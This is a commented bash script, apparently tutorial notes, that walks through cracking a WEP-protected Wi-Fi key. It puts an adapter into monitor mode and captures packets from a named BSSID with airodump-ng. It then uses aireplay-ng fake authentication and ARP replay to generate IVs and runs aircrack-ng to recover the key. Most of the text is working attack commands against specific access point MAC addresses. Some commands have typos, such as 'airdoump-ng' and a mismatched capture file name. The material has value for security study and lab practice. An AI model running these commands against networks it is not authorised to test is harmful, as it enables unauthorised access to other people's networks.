#!/bin/bash
# WEP uses an alogorithm called RC4 to encrypt its data

# we will use statistical attack to crack the WEP
# for us to use this kind of attack we need a network that is busy
# and thus sends large number of packets through the network
# if the network is idle the process will be a little bit more comples
# we will use airodump-ng to capture the data
# and then we will use aircrack ng to crack the key

# First set your wireless adapter to monitor mode
ifconfig wlan0 down

airmon-ng check kill

iwconfig wlan0 mode monitor

ifconfig wlan0 up

# then run airodump-ng to list all the network around you
airodump-ng --band abg wlan0

# now we're going to target this network only using the airodump
airodump-ng --bssid F8:23:B2:B9:50:A8 --channel 2 --write basic_wep mon0

# then we're going to run aircrack-ng against the file that we captured in order to crack the key
aircrack-ng basic_web-01.cap

# if aircrack-ng finds the key, you can now cancel the airodump that will still be continuing to 
# capture the packets in monitor mode
# you can now connect to the network using the ascii key/password that has been hacked by
# aircrack-ng
# you can also connect to the wifi using the key that comes before the the ascii e.g
# [key] (ascii) = KEY FOUND[ 41:73:32:33:70 ] ( ASCII: As23p )

# in some cases you will not see the ASCII password, so you'll have to connect using the key
# To use the key, remove all the colons that comes with it e.g. 4173323370
# after removing all the colons you can use the result as the password in your WEP network

#### WE SAW THAT FOR US TO TAKE A STATISTICAL ATTACK IN A WEP PROTECTED WIFI NETWORK
### WE NEED TO TO HAVE A LOT OF TRAFFIC IN THAT NETWORK, WHAT IF WE DON'T HAVE ENOUGHT
## TRAFFIC?
# SOLUTION: FORCE THE ACCESS POINT(AP) TO GENERATE NEW PACKETS WITH NEW IVs, WHICH WILL CAUSE THE NETWORK TO BE BUSY
# BEFORE DOING THIS WE NEED TO ASSOCIATE WITH THE NETWORK I.E. TELL THE NETWORK THAT WE NEED TO COMMUNICATE
# WITH IT BECAUSE BY DEFAULT ACCESS POINT IGNORE ANY REQUESTS THEY GET UNLESS THE DEVICE
# HAS CONNECTED TO THE NETWORK OR ASSOCIATED WITH IT

# THROUGH ASSOCIATION, WE'RE TELLING THE NETWORK, I WANT TO COMMUNICATE WITH YOU,
# DON'T IGNORE MY REQUESTS SOMETHING SIMILAR TO WHAT HAPPENS WHEN YOU'VE JUST 
# CLICKED ON THE NETWORK WHEN YOU WANT TO CONNECT TO IT, YOU STILL HAVENT PUT THE PASSWORD,
# YOU'RE JUST TELLING THE TARGET NETWORK I WANT TO COMMUNICATE WITH YOU, PLEASE DON'T IGNORE ME

airdoump-ng --bssid <mac-address-of-target> --channel <channel> --write arpreplay <wireless-adapter>

# ASSOCIATION
# To associate with the network we're going to use aireplay-ng
# The mac-address of the wireless adapter is the first 12 characters of the unspec field after you've run 
# your ifconfig
# on the below command replace the minuses with colons
# you can repeat the fake auth/ association multiple times for you to be sure that you can still communicate with your AP
aireplay-ng --fakeauth <number-of-times-to-carry-out-the-attack> -a <mac-address-of-the-target> -h <mac-address-of-wireless-adapter> <name-of-wireless-adapter>
aireplay-ng --fakeauth 0 -a 64:16:F0:EC:78:F3 -h 48:5D:60:2A:45:25 mon0


# GERNERATE MORE PACKETS AND IVS
# wait for an ARP packet
# capture it, and replay it (retransmit it)
# this couases the Access Point to produce another pakcet with a new IV
# keep doing this until we have enought IVs to crack the key

aireplay-ng --arpreplay -b <mac-address-of-the-target> -h <mac-address-of-wireless-adapter> <name-of-wireless-adapter>
aireplay-ng --arpreplay -b 64:16:F0:EC:78:F3 -h 48:5D:60:2A:45:25 mon0

# then we're going to run aircrack-ng against the file that we captured in order to crack the key
aircrack-ng basic_web-01.cap